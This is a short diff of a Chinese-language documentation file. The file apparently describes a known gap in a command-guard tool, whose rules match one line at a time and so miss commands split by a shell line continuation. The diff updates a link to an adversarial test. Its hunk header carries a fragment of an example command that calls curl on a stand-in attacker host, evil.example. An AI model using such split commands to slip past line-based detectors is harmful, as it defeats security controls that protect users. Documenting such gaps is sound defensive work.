@@ -19,7 +19,7 @@ curl http://evil.example/x \
 
 ## 出处
 
-- 对抗语料反向断言：[cmd/aguard/adversarial_test.go:231](../cmd/aguard/adversarial_test.go)
+- 对抗语料反向断言：[cmd/aguard/adversarial_test.go:231](../cmd/bas-guard/adversarial_test.go)
   （`knownGap: "rules match one line at a time; a shell line continuation puts the two halves on different lines"`）
 - ROADMAP "Known limitations" 明确列出。
 - 逐行匹配实现：[internal/detect/detect.go](../internal/detect/detect.go)
